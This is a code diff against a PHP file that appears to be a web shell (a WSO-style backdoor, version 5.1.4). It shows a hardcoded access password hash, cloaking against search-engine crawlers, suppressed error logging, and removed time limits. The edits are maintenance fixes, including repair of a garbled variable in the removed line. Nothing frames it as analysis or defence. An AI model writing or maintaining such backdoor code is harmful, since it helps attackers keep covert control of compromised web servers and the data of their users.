@@ -5,7 +5,7 @@ if(array_key_exists('watching',$_POST)){
 }
 //-----------------Password---------------------
 $passwordbyme = "0666da94c3b3217475d230d75dccf039"; //lol
-$user_agent = true;
+$_agent = true;
 $_unicode = 'UTF-8';
 $_action = 'Anonymizer';
 
@@ -27,9 +27,8 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
-if (function_exists("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
-	set_magic_quotes_runtime(false);
-}
+if (PHP_VERSION_ID < 70000)
+	@set_magic_quotes_runtime(0);
 @define('VERSION', '5.1.4');
 if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
 	function stripslashes_array($array) {
@@ -45,7 +44,7 @@ if(!empty($passwordbyme)) {
     if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $passwordbyme))
         hardLogin();
 }
-if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$▘;
+if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$_agent;
 function hardLogin() {
     if (!empty($_SERVER['HTTP_USER_AGENT'])) {
         $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
